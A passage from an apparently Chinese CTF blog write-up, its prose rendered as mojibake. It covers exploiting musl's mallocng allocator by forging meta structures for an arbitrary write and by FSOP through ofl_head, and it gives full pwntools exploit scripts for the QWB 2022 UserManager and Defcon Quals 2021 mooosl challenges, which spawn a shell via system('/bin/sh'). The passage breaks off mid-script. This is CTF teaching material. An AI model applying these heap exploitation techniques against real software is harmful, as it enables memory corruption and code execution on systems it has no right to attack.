ä¹æ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œå¦‚æœèƒ½å¤Ÿä¼ªé€  metaï¼Œå¯ä»¥ä»»æ„åœ°å€å†™</p><p><strong>è°ƒç”¨é€”å¾„</strong></p><ul><li>malloc -&gt; try_avail -&gt; dequeue</li><li>free -&gt; nontrivial_free -&gt; dequeue</li></ul><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><ol><li>æ³„éœ²ä¸€äº›é‡è¦ä¿¡æ¯<ul><li>å¤§éƒ¨åˆ†éƒ½å¯ä»¥ä» malloc_context ä¸­è·å–</li><li>libc åŸºå€</li><li>secret</li></ul></li><li>ä¼ªé€  meta_areaã€areaã€groupã€chunk<ul><li>ä¸‹é¢æ˜¯ä¸€äº›ä¼ªé€ çš„ç¡¬æ€§è¦æ±‚æˆ–è€…å»ºè®®</li><li>meta_area<ul><li>å› ä¸º get_meta æ—¶ä¼šæ£€æŸ¥ secret é˜²æ­¢ä¼ªé€ ï¼Œè€Œæ£€æŸ¥æ—¶å– meta_area åœ°å€æ˜¯å– area æ‰€åœ¨é¡µçš„åœ°å€ï¼Œå› æ­¤ä¼ªé€ çš„ meta_area åœ°å€å 12 ä½éƒ½è¦ä¸º 0ï¼Œä¸€èˆ¬é€šè¿‡ mmap ä¼ªé€ </li><li>check == malloc_context.secret</li></ul></li><li>area<ul><li>prevï¼Œnext æ”¹æˆæƒ³å†™çš„ä½ç½®</li><li>mem == fake_group</li><li>last_idx == 0ï¼Œä¸€èˆ¬åªéœ€è¦ä¼ªé€ ä¸€ä¸ª chunkï¼Œè¿™æ · free fake_chunk æ—¶ç›´æ¥èƒ½è¿›å…¥ <code>nontrivial_free</code></li><li>avail_maskï¼Œfreed_mask å…¨ä¸º 0 å³å¯ï¼ˆå› ä¸ºåªæœ‰ä¸€ä¸ªå°†è¦ free çš„ fake_chunkï¼‰</li><li>sc &lt; 48</li><li>freeable == 1</li><li>maplen != 0ï¼Œå¦åˆ™åœ¨ <code>free_group</code> ä¼šè¿›è¡Œé€’å½’ freeï¼Œéšä¾¿å–ä¸ªå€¼å°±è¡Œ</li></ul></li><li>group<ul><li>meta == fake_meta</li><li>active_idx == 0</li></ul></li><li>chunk<ul><li>ä¸€èˆ¬æ˜¯ fake_fike æˆ–è€…å…¶ä»–åƒåœ¾æ•°æ®</li></ul></li></ul></li></ol><p>ä¸‹é¢çš„ä¾‹å­æ˜¯å°† ofl_head æŒ‡å‘ fake_chunkï¼ˆfake_fileï¼‰ï¼Œexit æ—¶å°±å¯ä»¥å¯¼è‡´ FSOP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sc = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = p64(addr_fake_chunk) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(addr_ofl_head) <span class="comment"># next </span></span><br><span class="line">fake_meta += p64(addr_fake_group) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># avail &amp; freed mask</span></span><br><span class="line">fake_meta += p64(maplen &lt;&lt; <span class="number">12</span> | sc &lt;&lt; <span class="number">6</span> | freeable &lt;&lt; <span class="number">5</span> | last_idx)</span><br><span class="line"></span><br><span class="line">active_idx = <span class="number">0</span></span><br><span class="line">fake_group = p64(addr_fake_meta)</span><br><span class="line">fake_group += p64(active_idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_file</span></span><br><span class="line">fake_chunk = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">fake_chunk += p64(addr_system) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(secret) <span class="comment"># check</span></span><br><span class="line">fake_meta_area += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta_area += p64(<span class="number">1</span>) <span class="comment"># nsolts</span></span><br></pre></td></tr></table></figure><h2 id="2022-qwb-UserManager"><a href="#2022-qwb-UserManager" class="headerlink" title="2022 qwb UserManager"></a>2022 qwb UserManager</h2><p>è¿™é‡Œåªè¦ä¼šå †é£æ°´å°±è¡Œï¼Œä¸éœ€è¦ä¼ªé€ å°±å¯ä»¥ä»»æ„åœ°å€å†™ä¸€æ¬¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">insert</span><span class="params">(User *newUser, User *users)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> ( users )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// UAF</span></span><br><span class="line">    <span class="keyword">if</span> ( newUser-&gt;id == users-&gt;id )</span><br><span class="line">&#123;</span><br><span class="line">newUser-&gt;flag = users-&gt;flag;</span><br><span class="line">newUser-&gt;leftUser = users-&gt;leftUser;</span><br><span class="line">newUser-&gt;rightUser = users-&gt;rightUser;</span><br><span class="line">newUser-&gt;parentUser = users-&gt;parentUser;</span><br><span class="line"><span class="keyword">if</span> ( users-&gt;leftUser )</span><br><span class="line">users-&gt;leftUser-&gt;parentUser = newUser;</span><br><span class="line"><span class="keyword">if</span> ( users-&gt;rightUser )</span><br><span class="line">users-&gt;rightUser-&gt;parentUser = newUser;</span><br><span class="line"><span class="keyword">if</span> ( users-&gt;parentUser != (User *)<span class="number">0xDEADBEEF</span>LL )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( users == users-&gt;parentUser-&gt;leftUser )</span><br><span class="line">users-&gt;parentUser-&gt;leftUser = newUser;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">users-&gt;parentUser-&gt;rightUser = newUser;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(users-&gt;name);</span><br><span class="line"><span class="built_in">free</span>(users);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ·»åŠ  user çš„æ—¶å€™ï¼Œå¦‚æœæœ‰ id ç›¸åŒçš„ userï¼Œä¼šæŠŠåŸæ¥çš„ user é‡Šæ”¾æ‰ï¼Œä½†æ˜¯ users ä¼šæŒ‡å‘åŸæ¥çš„ userï¼Œé€ æˆ UAF</p><ol><li>å…ˆæ³„éœ²å‡º libc å’Œ elf åœ°å€</li><li>ä¸Šé¢çš„ç¬¬ 13 è¡Œå¯ä»¥ä»»æ„åœ°å€å†™ä¸€æ¬¡ï¼ŒæŠŠ ofl_head ä¿®æ”¹åˆ°å¯æ§ä½ç½®</li><li>ä¼ªé€  fake_file</li><li>æœ€å exit è¿›è¡Œ FSOP</li></ol><p>æœ€åå†™ fake_file çš„æ—¶å€™è¦å¤šæ¬¡å †é£æ°´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote(&#x27;&#x27;, )</span></span><br><span class="line">p = process(<span class="string">&#x27;./&#x27;</span> + __file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">addr_insert = elf.sym[<span class="string">&quot;insert&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span>, length, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Id: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;UserName: &quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Id: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Id: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui</span>(<span class="params">times=<span class="number">1</span>, length=<span class="number">0x8</span>, name=<span class="string">&quot;aaad\n&quot;</span>, <span class="built_in">id</span>=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        add(<span class="built_in">id</span>, length, name)</span><br><span class="line">        <span class="built_in">id</span> += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## leak addr</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x38</span>, <span class="string">&quot;aaad\n&quot;</span>) <span class="comment"># users</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x8</span>, <span class="string">&quot;aaad\n&quot;</span>)</span><br><span class="line">fengshui(<span class="number">6</span>)</span><br><span class="line">check(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">addr_elf = u64(p.recv(<span class="number">0x10</span>)[-<span class="number">8</span>:]) - <span class="number">0x5ca0</span></span><br><span class="line">addr_libc = u64(p.recv(<span class="number">0x20</span>)[-<span class="number">8</span>:]) - <span class="number">0xb7d60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&gt; addr_elf = &quot;</span>, <span class="built_in">hex</span>(addr_elf))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&gt; addr_libc = &quot;</span>, <span class="built_in">hex</span>(addr_libc))</span><br><span class="line"></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">addr_ofl_head = addr_libc + <span class="number">0xb6e48</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## write ofl_head to fake_file</span></span><br><span class="line">clear()</span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x38</span>, <span class="string">&quot;aaad\n&quot;</span>) <span class="comment"># users</span></span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x8</span>, <span class="string">&quot;aaad\n&quot;</span>)</span><br><span class="line">fengshui(<span class="number">6</span>)</span><br><span class="line">fake_user = p64(<span class="number">0x6873</span>) + p64(addr_libc + <span class="number">0xb7a60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) </span><br><span class="line">fake_user += p64(<span class="number">0xdeadbeef</span>) + p64(addr_ofl_head - <span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x38</span>, fake_user) <span class="comment"># user-&gt;name --&gt; users</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## construct fake_file</span></span><br><span class="line">clear()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x6873</span>, <span class="number">0x38</span>, p64(addr_system) * <span class="number">7</span>) <span class="comment"># ofl_head[0] = &quot;sh&quot;</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x8</span>, <span class="string">&quot;aaad\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x38</span>, p64(<span class="number">0</span>) * <span class="number">7</span>) <span class="comment"># ofl_head-&gt;lock = 0</span></span><br><span class="line">fengshui(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="number">0x38</span>, p64(addr_system) * <span class="number">7</span>) <span class="comment"># ofl_head-&gt;write = system</span></span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Defcon-Quals-2021-mooosl"><a href="#Defcon-Quals-2021-mooosl" class="headerlink" title="Defcon Quals 2021 mooosl"></a>Defcon Quals 2021 mooosl</h2><p>ç”¨çš„æœ¬åœ° libcï¼Œmusl 1.2.2-4 amd64</p><h3 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h3><p>ä¸€ä¸ªå…¸å‹çš„èœå•é¢˜ï¼Œå­˜å‚¨ KV</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">KV</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *key;</span><br><span class="line">  <span class="type">char</span> *value;</span><br><span class="line">  __int64 key_size;</span><br><span class="line">  __int64 value_size;</span><br><span class="line">  __int64 hash;</span><br><span class="line">  KV *next_KV;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>store</strong></p><p>æ¯æ¬¡å­˜å‚¨ä¸€ä¸ª KVï¼Œå†ç”³è¯· key å’Œ value å†…å­˜ï¼Œè®¡ç®— key çš„ hashï¼Œå– hash å 12 ä½å°†å…¶æ”¾å…¥ hash_map ä¸­ï¼Œç”¨å•é“¾è¡¨å­˜å‚¨ hash å 12 ä½ç›¸åŒçš„ KVï¼Œå¤´æ’æ³•</p><p>å¯ç”¨äºå †é£æ°´</p><p><strong>query</strong></p><p>å…ˆç”³è¯· key å†…å­˜ï¼Œç„¶åæ ¹æ® key çš„ hash åœ¨ hash_map ä¸­å¯»æ‰¾å¯¹åº”çš„ KVï¼Œè¾“å‡º value å†…å®¹ï¼Œæœ€åå°† key å†…å­˜ free</p><p>å¯ç”¨äº å †é£æ°´</p><p><strong>delete</strong></p><p>å…ˆç”³è¯· key å†…å­˜ï¼Œç„¶åæ ¹æ® key çš„ hash åœ¨ hash_map ä¸­å¯»æ‰¾å¯¹åº”çš„ KVï¼Œè¿›è¡Œåˆ é™¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kv = search(key, key_size);</span><br><span class="line"><span class="keyword">if</span> ( kv )</span><br><span class="line">&#123;</span><br><span class="line">    chain = &amp;hash_map[kv-&gt;hash &amp; <span class="number">0xFFF</span>];</span><br><span class="line">    <span class="comment">// è¿™é‡Œå¿½ç•¥äº†ä¸€ä¸ªæ¡ä»¶ï¼Œå½“ kv æ˜¯é“¾è¡¨å°¾çš„æ—¶å€™ï¼Œä¸Šä¸€ä¸ª kv çš„ next_KV æ²¡æœ‰ç½®é›¶ï¼Œå¯¼è‡´ UAF</span></span><br><span class="line">    <span class="keyword">if</span> ( kv == *chain || kv-&gt;next_KV )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> ( kv != *chain )</span><br><span class="line">            chain = &amp;(*chain)-&gt;next_KV;</span><br><span class="line">        *chain = kv-&gt;next_KV;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(kv-&gt;key);</span><br><span class="line">    <span class="built_in">free</span>(kv-&gt;value);</span><br><span class="line">    <span class="built_in">free</span>(kv);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨ç‚¹"><a href="#åˆ©ç”¨ç‚¹" class="headerlink" title="åˆ©ç”¨ç‚¹"></a>åˆ©ç”¨ç‚¹</h3><ol><li>ç”³è¯·ä¸¤ä¸ª hash å 12 ä½ç›¸åŒçš„ kvï¼Œ<code>delete</code> åé¢ä¸€ä¸ªé€ æˆ UAF</li><li>é€šè¿‡å †é£æ°´å’Œ <code>query</code> æ³„éœ²å‡ºé‡è¦ä¿¡æ¯</li><li>å†é€šè¿‡å †é£æ°´å’Œ <code>delete</code>ï¼Œä¼ªé€  meta_areaï¼Œé€šè¿‡ unsafe_unlink ä»»æ„åœ°å€å†™<ul><li>ä¸»è¦æ˜¯é€šè¿‡ <code>delete</code> çš„ free(kv-&gt;key) æˆ– free(kv-&gt;value) æ¥ unlink</li><li>å› ä¸ºè¿™ä¸¤ä¸ªæŒ‡é’ˆå¯ä»¥ä»»æ„å†™<del>ï¼ˆç¬”è€…æƒ³äº†å¥½ä¹…æ­»æ´»æ²¡æƒ³å‡ºæ¥ï¼‰</del></li></ul></li><li>é€šè¿‡æ”¹å†™ ofl_head æŒ‡å‘ä¼ªé€ çš„ file æœ€å exit å¯¼è‡´ FSOP<ul><li>ä¸‹é¢æ˜¯çœ‹åˆ«äºº wp æ˜¯åšæ³•ï¼Œè¦å†™ä¸‰æ¬¡ï¼Œä¼ªé€ ä¸‰æ¬¡<del>ï¼ˆé€†å¤©ï¼‰</del></li><li>é€šè¿‡æ”¹å†™ stdout çš„ write å‡½æ•°æŒ‡é’ˆä¸º <code>system</code> å’Œ flags ä¸º <code>/bin/sh\x00</code>ï¼Œå¹¶ä½¿ wpos != wbase å³å¯å¯¼è‡´ FSOP æ‹¿åˆ° shell</li></ul></li></ol><p>æ€è·¯å¾ˆç®€å•ï¼Œä½†æ˜¯ exp æ˜¯çœŸçš„éš¾å†™ğŸ˜­ğŸ˜­</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">address = <span class="string">&quot;&quot;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">filename = <span class="string">&quot;./&quot;</span> + __file__[<span class="number">0</span>:-<span class="number">3</span>]</span><br><span class="line">elf = ELF(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line"><span class="comment"># p = remote(address[0], address[1])</span></span><br><span class="line">p = process(__file__[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-musl/libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key, value, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size == <span class="literal">None</span> :</span><br><span class="line">        key_size = <span class="built_in">len</span>(key)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(key_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> value_size == <span class="literal">None</span> :</span><br><span class="line">        value_size = <span class="built_in">len</span>(value)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(value_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size == <span class="literal">None</span> :</span><br><span class="line">        key_size = <span class="built_in">len</span>(key)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(key_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size == <span class="literal">None</span> :</span><br><span class="line">        key_size = <span class="built_in">len</span>(key)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(key_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    p.send(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;4&quot;</span>)    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">key</span>):</span><br><span class="line">vi = <span class="number">2021</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">vi = <span class="number">0x13377331</span> * vi + key[i]</span><br><span class="line"><span class="keyword">return</span> vi &amp; <span 